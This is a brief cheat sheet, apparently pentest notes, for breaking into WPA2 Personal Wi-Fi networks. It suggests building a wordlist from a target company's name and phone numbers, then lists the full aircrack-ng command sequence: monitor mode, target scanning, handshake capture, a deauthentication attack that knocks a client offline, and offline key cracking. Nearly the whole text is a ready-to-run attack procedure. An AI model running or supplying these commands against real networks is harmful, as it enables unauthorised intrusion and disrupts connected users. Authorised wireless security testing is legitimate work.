# Hacking Wifi

## WPA2 Personal
### Notes
Custom wordlist - Company name, all phone numbers, company info
Run all possible combinations of phone numbers

### Aircrack
```bash
# Monitor mode
airmon-ng start <wlan adapter>

# Find the target
airodump-ng <wlan adapter mon>

# Narrow down by channel
airodump-ng -c <channel> --bssid <mac> -w <cap file> <ifacemon>

# Deauth Attack
New Terminal
aireplay-ng -0 1 -a <mac of AP> -c <mac of client> <ifacemon>

#Look for WPA Handshake before closing airodump

# Crack the key
aircrack-ng -w <wordlist> -b <AP Mac Address> <capturefile .cap>
```
